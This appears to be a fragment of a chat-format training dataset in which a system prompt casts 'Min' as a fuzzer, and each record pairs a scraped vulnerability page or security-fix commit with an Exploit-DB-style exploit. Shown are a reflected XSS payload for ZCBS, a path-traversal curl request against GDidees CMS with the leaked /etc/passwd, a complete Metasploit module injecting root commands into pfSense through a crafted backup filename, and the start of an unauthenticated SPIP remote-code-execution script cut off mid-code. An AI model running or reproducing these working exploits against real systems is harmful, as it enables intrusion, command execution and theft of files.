\n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        bigzooooz\n \n/\n\nCVE-2023-26692\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    0\n \n          Star\n 1\n  \n        ZCBS/ZBBS/ZPBS v4.14k - Reflected XSS\n      \n\n1\n          star\n \n\n0\n          forks\n \n\nBranches\n \n\nTags\n \n\nActivity\n \n\n \n          Star\n\n  \n\n \n\nNotifications\n You must be signed in to change notification settings\n\nCode\n\nIssues\n0\nPull requests\n0\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Issues\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nbigzooooz/CVE-2023-26692\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n \n\n    mainBranchesTagsGo to fileCodeFolders and filesNameNameLast commit messageLast commit dateLatest commit History2 CommitsREADME.mdREADME.md  View all filesRepository files navigationREADMECVE-2023-26692\nZCBS/ZCBS/ZPBS/ZBBS Reflected XSS\nExploit Title: ZCBS/ZBBS/ZPBS v4.14k - Reflected XSS\nDate: 2023-03-30\nCVE: CVE-2023-26692\nExploit Author: Abdulaziz Saad (@b4zb0z)\nVendor Homepage: https://www.zcbs.nl\nSoftware Link: https://www.zcbs.nl/cgi-bin/objecten.pl\nVersion: 4.14k\nTested on: LAMP, Ubuntu\n\n[#] Vulnerability :\n$_GET['ident']\n[#] Exploitation :\nhttps://localhost/cgi-bin/objecten.pl?ident=%3Cimg%20src=x%20onerror=alert(%22XSS%22)%3E\n   \nAbout\n\n        ZCBS/ZBBS/ZPBS v4.14k - Reflected XSS\n      \nResources\n\n        Readme\n \n\nActivity\n \nStars\n\n1\n      star\n \nWatchers\n\n1\n      watching\n \nForks\n\n0\n      forks\n \n          Report repository\n \n\n    Releases\n\nNo releases published\n    Packages\n      0\n        No packages published \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsZCBS Zijper Collectie Beheer Systeem (ZCBS), Zijper Publication Management System (ZPBS), and Zijper Image Bank Management System (ZBBS) 4.14k is vulnerable to Cross Site Scripting (XSS).\n\nexploit\n/cgi/webapps/51347.txt\n# Exploit Title: ZCBS/ZBBS/ZPBS v4.14k - Reflected Cross-Site Scripting (XSS)\n# Date: 2023-03-30\n# CVE: CVE-2023-26692\n# Exploit Author: Abdulaziz Saad (@b4zb0z)\n# Vendor Homepage: https://www.zcbs.nl\n# Version: 4.14k\n# Tested on: LAMP, Ubuntu\n# Google Dork: inurl:objecten.pl?ident=3D\n\n---\n\n[#] Vulnerability :\n\n`$_GET['ident']`\n\n\n[#] Exploitation :\n\n`https://localhost/cgi-bin/objecten.pl?ident=3D%3Cimg%20src=3Dx%20onerror=\n=3Dalert(%22XSS%22)%3E`\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://gist.github.com/Hadi999/516aa25b953b0cba57089a0c11b1305b\nCVE-2023-27179.txt · GitHub\n\nSkip to content\n\n \n \nAll gists\nBack to GitHub\n\n      Sign in\n        Sign up\n\n        Sign in\n \n          Sign up\n \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        Instantly share code, notes, and snippets.\n      \n\nHadi999/CVE-2023-27179.txt\n\n          Last active\n          April 6, 2023 11:35\n\n \nShow Gist options\n \n\n          Download ZIP\n\n \n \n \n\nStar\n\n(0)\n0\nYou must be signed in to star a gist\n \n\nFork\n\n(0)\n0\nYou must be signed in to fork a gist\n \nEmbed\n\n \n\n           Embed\n \n            Embed this gist in your website.\n          \n\n           Share\n \n            Copy sharable link for this gist.\n          \n\n          Clone via HTTPS\n \n            Clone using the web URL.\n          \n                Learn more about clone URLs\n \n \n\n        Clone this repository at &lt;script src=&quot;https://gist.github.com/Hadi999/516aa25b953b0cba57089a0c11b1305b.js&quot;&gt;&lt;/script&gt;\n \n \nSave Hadi999/516aa25b953b0cba57089a0c11b1305b to your computer and use it in GitHub Desktop.\n      Code\n\n        Revisions\n        2\n \nEmbed\n\n \n\n           Embed\n \n            Embed this gist in your website.\n          \n\n           Share\n \n            Copy sharable link for this gist.\n          \n\n          Clone via HTTPS\n \n            Clone using the web URL.\n          \n                Learn more about clone URLs\n \n \n\n        Clone this repository at &lt;script src=&quot;https://gist.github.com/Hadi999/516aa25b953b0cba57089a0c11b1305b.js&quot;&gt;&lt;/script&gt;\n \n\n \nSave Hadi999/516aa25b953b0cba57089a0c11b1305b to your computer and use it in GitHub Desktop.\nDownload ZIP\n \nRaw\n\n              CVE-2023-27179.txt\n            \n> [Suggested description]\n\n> GDidees CMS v3.9.1 and lower was discovered to contain an arbitrary\n\n> file download vulnerability via the filename parameter at\n\n> /_admin/imgdownload.php.\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Vulnerability Type]\n\n> Incorrect Access Control\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Vendor of Product]\n\n> GDidees\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Affected Product Code Base]\n\n> GDidees CMS - 3.9.1 and lower versions\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Affected Component]\n\n> The affected file is {webroot}/_admin/imgdownload.php and the vulnerable GET parameter is 'filename'.\n\n> Even if the script is in the administrative directory there is no admin session control in the code with means any visitor can download files.\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Attack Type]\n\n> Remote\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Impact Information Disclosure]\n\n> true\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Attack Vectors]\n\n> In order to successfully exploit this vulnerability an attacker need to make a GET request the following url.\n\n> \n\n> URL : [http://{gdidees_root}/_admin/imgdownload.php?filename=../../../../../etc/passwd]http://{gdidees_root}/_admin/imgdownload.php?filename=../../../../../etc/passwd ( /etc/passwd is the file we want to read)\n\n> If the request has been using an Browser then the content of the file will be downloaded with an .png extension or directly printed if using cURL.\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Reference]\n\n> https://www.gdidees.eu/cms-1-0.html\n\n> https://knowledge-base.secureflag.com/vulnerabilities/unrestricted_file_download/unrestricted_file_download_vulnerability.html\n\n> \n\n> ------------------------------------------\n\n> \n\n> [Discoverer]\n\n> Hadi Mene\n\nSign up for free\nto join this conversation on GitHub.\n    Already have an account?\n    Sign in to comment\n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsGDidees CMS v3.9.1 and lower was discovered to contain an arbitrary file download vulenrability via the filename parameter at /_admin/imgdownload.php.\n\nexploit\n/php/webapps/51381.txt\n# Exploit Title: GDidees CMS 3.9.1 - Local File Disclosure\n# Date : 03/27/2023\n# Exploit Author : Hadi Mene\n# Vendor Homepage : https://www.gdidees.eu/\n# Software Link : https://www.gdidees.eu/cms-1-0.html\n# Version : 3.9.1 and earlier\n# Tested on : Debian 11\n# CVE : CVE-2023-27179\n\n### Summary:\n\nGDidees CMS v3.9.1 and lower versions was discovered to contain a local file disclosure vulnerability via the filename parameter at /_admin/imgdownload.php.\n\n\n### Description :\n\nImgdownload.php is mainly used by the QR code generation module to download an QR code.\nThe vulnerability occurs in line 4 where the filename parameter which will be opened later is not filtered or sanitized.\nFurthermore, there is no admin session check in this code as it should since only the admin user should normally\nbe able to download QR code.\n\nVulnerable Code :\n\n3. if (isset($_GET[\"filename\"])) {\n4.        $filename=$_GET[\"filename\"];\n\t  .....\n          .....\n27. @readfile($filename) OR die();\n\n\n### POC :\n\nURL : https://[GDIDEESROOT]/_admin/imgdownload.php?filename=../../../../../../etc/passwd\n\nExploitation using curl\n# curl http://192.168.0.32/cmsgdidees3.9.1-mysqli/_admin/imgdownload.php?filename=../../../../../etc/passwd\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nntp:x:104:110::/nonexistent:/usr/sbin/nologin\nmessagebus:x:105:111::/nonexistent:/usr/sbin/nologin\nuuidd:x:106:112::/run/uuidd:/usr/sbin/nologin\npulse:x:107:115:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nlightdm:x:108:117:Light Display Manager:/var/lib/lightdm:/bin/false\nhadi:x:1000:1000:hadi,,,:/home/hadi:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nvboxadd:x:998:1::/var/run/vboxadd:/bin/false\nopenldap:x:109:118:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false\n\n\n### References:\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-27179\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-27179\nhttps://www.exploit-db.com/papers/12883\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://github.com/pfsense/pfsense/commit/ca80d18493f8f91b21933ebd6b714215ae1e5e94\nCorrect RRD backup/restore cmd file handling. Fixes #13935 · pfsense/pfsense@ca80d18 · GitHub\n\nSkip to content\n\nNavigation Menu\n\nToggle navigation\n          Sign in\n        \n \n\n        Product\n        \nActions\n        Automate any workflow\n      \n\nPackages\n        Host and manage packages\n      \n\nSecurity\n        Find and fix vulnerabilities\n      \n\nCodespaces\n        Instant dev environments\n      \n\nGitHub Copilot\n        Write better code with AI\n      \n\nCode review\n        Manage code changes\n      \n\nIssues\n        Plan and track work\n      \n\nDiscussions\n        Collaborate outside of code\n      \nExplore\n\n      All features\n\n    \n\n      Documentation\n\n    \n\n      GitHub Skills\n\n    \n\n      Blog\n\n    \n\n        Solutions\n        \n\nFor\n\n      Enterprise\n\n    \n\n      Teams\n\n    \n\n      Startups\n\n    \n\n      Education\n\n    \nBy Solution\n\n      CI/CD & Automation\n\n    \n\n      DevOps\n\n    \n\n      DevSecOps\n\n    \nResources\n\n      Learning Pathways\n\n    \n\n      White papers, Ebooks, Webinars\n\n    \n\n      Customer Stories\n\n    \n\n      Partners\n\n    \n\n        Open Source\n        \n\nGitHub Sponsors\n        Fund open source developers\n      \nThe ReadME Project\n        GitHub community articles\n      \nRepositories\n\n      Topics\n\n    \n\n      Trending\n\n    \n\n      Collections\n\n    \n\n        Enterprise\n        \nEnterprise platform\n        AI-powered developer platform\n      \nAvailable add-ons\n\nAdvanced Security\n        Enterprise-grade security features\n      \n\nGitHub Copilot\n        Enterprise-grade AI features\n      \n\nPremium Support\n        Enterprise-grade 24/7 support\n      \nPricing\nSearch or jump to...\n\nSearch code, repositories, users, issues, pull requests...\n\n \n        Search\n      \n\nClear\n \n\n \n              Search syntax tips\n \n        Provide feedback\n      \n\n \nWe read every piece of feedback, and take your input very seriously.\nInclude my email address so I can be contacted\n     Cancel\n\n    Submit feedback\n        Saved searches\n      \nUse saved searches to filter your results more quickly\n\n \n\nName\nQuery\n\n            To see all available qualifiers, see our documentation.\n          \n \n\n     Cancel\n\n    Create saved search\n              Sign in\n            \n              Sign up\n            \n\nYou signed in with another tab or window. Reload to refresh your session.\nYou signed out in another tab or window. Reload to refresh your session.\nYou switched accounts on another tab or window. Reload to refresh your session.\n \nDismiss alert\n\n        pfsense\n \n/\n\npfsense\n\nPublic\n\n \n\nNotifications\n You must be signed in to change notification settings\n \n\nFork\n    1.4k\n \n          Star\n 4.7k\n  \nCode\n\nPull requests\n36\nActions\n\nProjects\n0\nSecurity\n\nInsights\n\n \n\n \nAdditional navigation options\n \n          Code\n          Pull requests\n          Actions\n          Projects\n          Security\n          Insights\n\n \n\nCommit\n\nPermalink\n\nThis commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.\n\n          Correct RRD backup/restore cmd file handling. Fixes #13935\n        \n\nBrowse files\nBrowse the repository at this point in the history\nLoading branch information\n\n \njim-p\n    \n  committed\n  Feb 6, 2023\n\n        1 parent\n          \n          053f60e\n\ncommit ca80d18\n \n Show file tree\n \n Hide file tree\n\n      Showing\n      2 changed files\n      with\n      4 additions\n      and\n      4 deletions.\n    \n \nWhitespace\n \nIgnore whitespace\n\n \nSplit\n \nUnified\n \n\n \n        src\n      \n\n        etc/inc\n      \n\nsrc/etc/inc/config.lib.inc\n\n        config.lib.inc\n      \n        usr/local/pfSense/include/www\n      \n\nsrc/usr/local/pfSense/include/www/backup.inc\n\n        backup.inc\n      \n\n \n        There are no files selected for viewing\n\n \n\n            6 changes: 3 additions & 3 deletions\n          \n6 \n\nsrc/etc/inc/config.lib.inc\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -280,22 +280,22 @@ function restore_rrddata($conf = false) {\n\n foreach ($conf['rrddata']['rrddatafile'] as $rrd) {\n\n if ($rrd['xmldata']) {\n\n $rrd_file = \"{$g['vardb_path']}/rrd/{$rrd['filename']}\";\n\n $rrd_file = \"{$g['vardb_path']}/rrd/\" . basename($rrd['filename']);\n\n $xml_file = preg_replace('/\\.rrd$/', \".xml\", $rrd_file);\n\n if (file_put_contents($xml_file, gzinflate(base64_decode($rrd['xmldata']))) === false) {\n\n\t\t\t\tlog_error(sprintf(gettext(\"Cannot write %s\"), $xml_file));\n\n continue;\n\n\t\t\t}\n\n $output = array();\n\n $status = null;\n\n\t\t\texec(\"$rrdtool restore -f '{$xml_file}' '{$rrd_file}'\", $output, $status);\n\n\t\t\texec(\"{$rrdtool} restore -f \" . escapeshellarg($xml_file) . ' ' . escapeshellarg($rrd_file), $output, $status);\n\n if ($status) {\n\n\t\t\t\tlog_error(\"rrdtool restore -f '{$xml_file}' '{$rrd_file}' failed returning {$status}.\");\n\n continue;\n\n\t\t\t}\n\n\t\t\tunlink($xml_file);\n\n\t\t} else if ($rrd['data']) {\n\n $rrd_file = \"{$g['vardb_path']}/rrd/{$rrd['filename']}\";\n\n $rrd_file = \"{$g['vardb_path']}/rrd/\" . basename($rrd['filename']);\n\n $rrd_fd = fopen($rrd_file, \"w\");\n\n if (!$rrd_fd) {\n\n\t\t\t\tlog_error(sprintf(gettext(\"Cannot write %s\"), $rrd_file));\nExpand Down\n            2 changes: 1 addition & 1 deletion\n          \n2 \n\nsrc/usr/local/pfSense/include/www/backup.inc\n \n\n              Show comments\n            \n   View file\n      Edit file\n    \n\n    Delete file\n  \nOriginal file line number\nDiff line number\nDiff line change\nExpand Up\n\n@@ -51,7 +51,7 @@ function rrd_data_xml() {\n\n foreach ($rrd_files as $rrd_file) {\n\n $basename = basename($rrd_file);\n\n $xml_file = preg_replace('/\\.rrd$/', \".xml\", $rrd_file);\n\n\t\texec(\"$rrdtool dump '{$rrd_file}' '{$xml_file}'\");\n\n\t\texec(\"{$rrdtool} dump \" . escapeshellarg($rrd_file) . ' ' . escapeshellarg($xml_file));\n\n $xml_data = file_get_contents($xml_file);\n\n\t\tunlink($xml_file);\n\n if ($xml_data !== false) {\nExpand Down\n\nToggle all file notes\nToggle all file annotations\n\n    0 comments\n    on commit ca80d18\n\n  \n\n    Please\n  sign in to comment.\n\n \n\nFooter\n        © 2024 GitHub, Inc.\n      \nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\n      Manage cookies\n    \n\n      Do not share my personal information\n    \n    You can’t perform that action at this time.\n  \n\n"}, {"role": "assistant", "content": "descriptionsA command injection vulnerability in the function restore_rrddata() of Netgate pfSense v2.7.0 allows authenticated attackers to execute arbitrary commands via manipulating the contents of an XML file supplied to the component config.xml.\n\nexploit\n/php/webapps/51608.rb\n# Exploit Title: pfSense v2.7.0 - OS Command Injection\n#Exploit Author: Emir Polat\n# CVE-ID : CVE-2023-27253\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'pfSense Restore RRD Data Command Injection',\n        'Description' => %q{\n          This module exploits an authenticated command injection vulnerabilty in the \"restore_rrddata()\" function of\n          pfSense prior to version 2.7.0 which allows an authenticated attacker with the  \"WebCfg - Diagnostics: Backup & Restore\"\n          privilege to execute arbitrary operating system commands as the \"root\" user.\n\n          This module has been tested successfully on version 2.6.0-RELEASE.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Emir Polat', # vulnerability discovery & metasploit module\n        ],\n        'References' => [\n          ['CVE', '2023-27253'],\n          ['URL', 'https://redmine.pfsense.org/issues/13935'],\n          ['URL', 'https://github.com/pfsense/pfsense/commit/ca80d18493f8f91b21933ebd6b714215ae1e5e94']\n        ],\n        'DisclosureDate' => '2023-03-18',\n        'Platform' => ['unix'],\n        'Arch' => [ ARCH_CMD ],\n        'Privileged' => true,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'Payload' => {\n          'BadChars' => \"\\x2F\\x27\",\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic netcat'\n            }\n        },\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options [\n      OptString.new('USERNAME', [true, 'Username to authenticate with', 'admin']),\n      OptString.new('PASSWORD', [true, 'Password to authenticate with', 'pfsense'])\n    ]\n  end\n\n  def check\n    unless login\n      return Exploit::CheckCode::Unknown(\"#{peer} - Could not obtain the login cookies needed to validate the vulnerability!\")\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diag_backup.php'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    return Exploit::CheckCode::Unknown(\"#{peer} - Could not connect to web service - no response\") if res.nil?\n    return Exploit::CheckCode::Unknown(\"#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}\") unless res.code == 200\n\n    unless res&.body&.include?('Diagnostics: ')\n      return Exploit::CheckCode::Safe('Vulnerable module not reachable')\n    end\n\n    version = detect_version\n    unless version\n      return Exploit::CheckCode::Detected('Unable to get the pfSense version')\n    end\n\n    unless Rex::Version.new(version) < Rex::Version.new('2.7.0-RELEASE')\n      return Exploit::CheckCode::Safe(\"Patched pfSense version #{version} detected\")\n    end\n\n    Exploit::CheckCode::Appears(\"The target appears to be running pfSense version #{version}, which is unpatched!\")\n  end\n\n  def login\n    # Skip the login process if we are already logged in.\n    return true if @logged_in\n\n    csrf = get_csrf('index.php', 'GET')\n    unless csrf\n      print_error('Could not get the expected CSRF token for index.php when attempting login!')\n      return false\n    end\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'POST',\n      'vars_post' => {\n        '__csrf_magic' => csrf,\n        'usernamefld' => datastore['USERNAME'],\n        'passwordfld' => datastore['PASSWORD'],\n        'login' => ''\n      },\n      'keep_cookies' => true\n    )\n\n    if res && res.code == 302\n      @logged_in = true\n      true\n    else\n      false\n    end\n  end\n\n  def detect_version\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'index.php'),\n      'method' => 'GET',\n      'keep_cookies' => true\n    )\n\n    # If the response isn't a 200 ok response or is an empty response, just return nil.\n    unless res && res.code == 200 && res.body\n      return nil\n    end\n\n    if (%r{Version.+<strong>(?<version>[0-9.]+-RELEASE)\\n?</strong>}m =~ res.body).nil?\n      nil\n    else\n      version\n    end\n  end\n\n  def get_csrf(uri, methods)\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, uri),\n      'method' => methods,\n      'keep_cookies' => true\n    )\n\n    unless res && res.body\n      return nil # If no response was returned or an empty response was returned, then return nil.\n    end\n\n    # Try regex match the response body and save the match into a variable named csrf.\n    if (/var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body).nil?\n      return nil # No match could be found, so the variable csrf won't be defined.\n    else\n      return csrf\n    end\n  end\n\n  def drop_config\n    csrf = get_csrf('diag_backup.php', 'GET')\n    unless csrf\n      fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when dropping the config!')\n    end\n\n    post_data = Rex::MIME::Message.new\n\n    post_data.add_part(csrf, nil, nil, 'form-data; name=\"__csrf_magic\"')\n    post_data.add_part('rrddata', nil, nil, 'form-data; name=\"backuparea\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password_confirm\"')\n    post_data.add_part('Download configuration as XML', nil, nil, 'form-data; name=\"download\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"restorearea\"')\n    post_data.add_part('', 'application/octet-stream', nil, 'form-data; name=\"conffile\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"decrypt_password\"')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diag_backup.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s,\n      'keep_cookies' => true\n    )\n\n    if res && res.code == 200 && res.body =~ /<rrddatafile>/\n      return res.body\n    else\n      return nil\n    end\n  end\n\n  def exploit\n    unless login\n      fail_with(Failure::NoAccess, 'Could not obtain the login cookies!')\n    end\n\n    csrf = get_csrf('diag_backup.php', 'GET')\n    unless csrf\n      fail_with(Failure::UnexpectedReply, 'Could not get the expected CSRF token for diag_backup.php when starting exploitation!')\n    end\n\n    config_data = drop_config\n    if config_data.nil?\n      fail_with(Failure::UnexpectedReply, 'The drop config response was empty!')\n    end\n\n    if (%r{<filename>(?<file>.*?)</filename>} =~ config_data).nil?\n      fail_with(Failure::UnexpectedReply, 'Could not get the filename from the drop config response!')\n    end\n    config_data.gsub!(' ', '${IFS}')\n    send_p = config_data.gsub(file, \"WAN_DHCP-quality.rrd';#{payload.encoded};\")\n\n    post_data = Rex::MIME::Message.new\n\n    post_data.add_part(csrf, nil, nil, 'form-data; name=\"__csrf_magic\"')\n    post_data.add_part('rrddata', nil, nil, 'form-data; name=\"backuparea\"')\n    post_data.add_part('yes', nil, nil, 'form-data; name=\"donotbackuprrd\"')\n    post_data.add_part('yes', nil, nil, 'form-data; name=\"backupssh\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password\"')\n    post_data.add_part('', nil, nil, 'form-data; name=\"encrypt_password_confirm\"')\n    post_data.add_part('rrddata', nil, nil, 'form-data; name=\"restorearea\"')\n    post_data.add_part(send_p.to_s, 'text/xml', nil, \"form-data; name=\\\"conffile\\\"; filename=\\\"rrddata-config-pfSense.home.arpa-#{rand_text_alphanumeric(14)}.xml\\\"\")\n    post_data.add_part('', nil, nil, 'form-data; name=\"decrypt_password\"')\n    post_data.add_part('Restore Configuration', nil, nil, 'form-data; name=\"restore\"')\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'diag_backup.php'),\n      'method' => 'POST',\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data' => post_data.to_s,\n      'keep_cookies' => true\n    )\n\n    if res\n      print_error(\"The response to a successful exploit attempt should be 'nil'. The target responded with an HTTP response code of #{res.code}. Try rerunning the module.\")\n    end\n  end\nend\n"}]}
{"messages": [{"role": "system", "content": "Min is a fuzzer that gives you the source code and other information that details the inputs that cause it to exploit or to crash."}, {"role": "user", "content": "source code:\nhttps://git.spip.net/spip/spip/commit/5aedf49b89415a4df3eb775eee3801a2b4b88266\n  Skip to content\nGitLab\nExplore\nSign in\nRegister\nspip\nspip\nCommits\n5aedf49b\nCommit 5aedf49b\nauthored 1 year ago by cerdic\nBrowse files\nOptions\nFix: Sanitizer toutes les valeurs passées aux formulaires\nRefs: spip-team/securite#4839\n(cherry picked from commit bbd88bd24a25e4e4aa9b0d12ff0124df8df9c4f1)\n(cherry picked from commit 0d4a43f8)\nparent 9394e2f0\nNo related merge requests found\nChanges\n1\nHide whitespace changes\nInline\nSide-by-side\nShowing\n1 changed file\nwith 1 addition and 2 deletions\nAdministrator\n@root\nmentioned in merge request !5511 (merged) · 3 months ago\nPlease register or sign in to comment\nForge communautaire SPIP | Charte d'utilisation | Signaler un problème sur ce site\n\n"}, {"role": "assistant", "content": "descriptionsSPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.\n\nexploit\n/php/webapps/51536.py\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# Exploit Title: SPIP v4.2.1 - Remote Code Execution (Unauthenticated)\n# Google Dork: inurl:\"/spip.php?page=login\"\n# Date: 19/06/2023\n# Exploit Author: nuts7 (https://github.com/nuts7/CVE-2023-27372)\n# Vendor Homepage: https://www.spip.net/\n# Software Link: https://files.spip.net/spip/archives/\n# Version: < 4.2.1 (Except few fixed versions indicated in the description)\n# Tested on: Ubuntu 20.04.3 LTS, SPIP 4.0.0\n# CVE reference : CVE-2023-27372 (coiffeur)\n# CVSS : 9.8 (Critical)\n#\n# Vulnerability Description:\n#\n# SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.\n# This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.\n#\n# Usage: python3 CVE-2023-27372.py http://example.com\n\nimport argparse\nimport bs4\nimport html\nimport requests\n\ndef parseArgs():\n    parser = argparse.ArgumentParser(description=\"Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by nuts7\")\n    parser.add_argument(\"-u\", \"--url\", default=None, required=True, help=\"SPIP application base URL\")\n    parser.add_argument(\"-c\", \"--command\", default=None, required=True, help=\"Command to execute\")\n    parser.add_argument(\"-v\", \"--verbose\", default=False, action=\"store_true\", help=\"Verbose mode. (default: False)\")\n    return parser.parse_args()\n\ndef get_anticsrf(url):\n    r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=10)\n    soup = bs4.BeautifulSoup(r.text, 'html.parser')\n    csrf_input = soup.find('input', {'name': 'formulaire_action_args'})\n    if csrf_input:\n        csrf_value = csrf_input['value']\n        if options.verbose:\n            print(\"[+] Anti-CSRF token found : %s\" % csrf_value)\n        return csrf_value\n    else:\n        print(\"[-] Unable to find Anti-CSRF token\")\n        return -1\n\ndef send_payload(url, payload):\n    data = {\n        \"page\": \"spip_pass\",\n        \"formulaire_action\": \"oubli\",\n        \"formulaire_action_args\": csrf,\n        \"oubli\": 